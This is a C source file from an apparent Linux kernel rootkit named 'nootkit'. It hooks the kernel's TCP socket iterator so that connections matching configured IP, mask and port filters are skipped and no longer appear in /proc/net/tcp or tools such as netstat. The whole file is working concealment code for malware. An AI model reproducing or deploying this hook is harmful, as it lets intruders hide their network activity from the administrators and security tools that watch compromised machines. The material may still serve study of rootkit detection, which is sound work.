#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/seq_file.h>
#include <linux/tcp.h>
#include <linux/kernel.h>
#include <net/tcp.h>
#include <linux/socket.h>

#include <hook.h>
#include <ksyms.h>
#include <config.h>

void *tcp_seq_next_hook(struct seq_file *seq, void *v, loff_t *pos)
{
    /* hook code */

    int i;
    struct sock *sock;
    struct config_connection *filter;

    /* original tcp_seq_next_hook code */

    struct tcp_iter_state *st = seq->private;
    void *rc = NULL;

    if (v == SEQ_START_TOKEN) {
        rc = ksyms__tcp_get_idx(seq, 0);
        goto out;
    }

    switch (st->state) {
    case TCP_SEQ_STATE_LISTENING:
        rc = ksyms__listening_get_next(seq, v);
        if (!rc) {
            st->state = TCP_SEQ_STATE_ESTABLISHED;
            st->bucket = 0;
            st->offset = 0;
            rc	  = ksyms__established_get_first(seq);
        }
        break;
    case TCP_SEQ_STATE_ESTABLISHED:
        rc = ksyms__established_get_next(seq, v);
        break;
    }
out:
    ++*pos;
    st->last_pos = *pos;

    /* hook code */

    if (rc) {
        sock = ((struct sock *)rc);

        for (i = 0; i < hide_sockets_count; i++) {
            filter = &hide_sockets[i];

            if ((NOOTKIT_TCP != filter->proto)
                || (AF_INET != sock->sk_family)
                || ((filter->local_ip & filter->local_ip_mask) != (sock->sk_rcv_saddr & filter->local_ip_mask))
                || ((filter->foreign_ip & filter->foreign_ip_mask) != (sock->sk_daddr & filter->foreign_ip_mask))
                || (!(
                    /* sk_num is stored in host byte order, while sk_dport is always BE */
                       (__le16_to_cpu(filter->local_port_start) <= sock->sk_num)
                    && (__le16_to_cpu(filter->local_port_end) >= sock->sk_num)
                ))
                || (!(
                       (__le16_to_cpu(filter->foreign_port_start) <= __be16_to_cpu(sock->sk_dport))
                    && (__le16_to_cpu(filter->foreign_port_end) >= __be16_to_cpu(sock->sk_dport))
                )))
                continue;
            
            printk(KERN_INFO "nootkit: Hiding TCP socket because of filter [%s]!", hide_sockets_strs[i]);
            return seq->op->next(seq, rc, pos);
        }
    }

    /* original tcp_seq_next_hook code */

    return rc;
}

HOOK_DEFINE(hide, tcp_seq_next, &tcp_seq_next, &tcp_seq_next_hook)
